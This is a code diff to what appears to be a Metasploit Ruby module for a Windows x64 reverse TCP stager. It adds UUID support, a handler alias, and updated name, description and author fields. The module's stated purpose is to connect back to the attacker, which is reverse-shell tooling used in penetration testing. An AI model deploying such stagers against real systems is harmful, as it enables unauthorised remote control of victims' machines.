@@ -9,16 +9,20 @@ require 'msf/core/payload/windows/x64/reverse_tcp'
 
 module Metasploit4
 
-  CachedSize = 437
+  CachedSize = 478
 
   include Msf::Payload::Stager
   include Msf::Payload::Windows::ReverseTcp_x64
 
+  def self.handler_type_alias
+    'reverse_tcp_uuid'
+  end
+
   def initialize(info = {})
     super(merge_info(info,
-      'Name'        => 'Windows x64 Reverse TCP Stager',
-      'Description' => 'Connect back to the attacker (Windows x64)',
-      'Author'      => [ 'sf' ],
+      'Name'        => 'Windows x64 Reverse TCP Stager with UUID support',
+      'Description' => 'Connect back to the attacker, send UUID first (Windows x64)',
+      'Author'      => ['OJ Reeves'],
       'License'     => MSF_LICENSE,
       'Platform'    => 'win',
       'Arch'        => ARCH_X86_64,
@@ -26,6 +30,14 @@ module Metasploit4
       'Convention'  => 'sockrdi',
       'Stager'      => { 'RequiresMidstager' => false }
     ))
+  end
+
+  #
+  # Override the uuid function and opt-in for sending the
+  # UUID in the stage.
+  #
+  def include_send_uuid
+    true
   end
 
 end
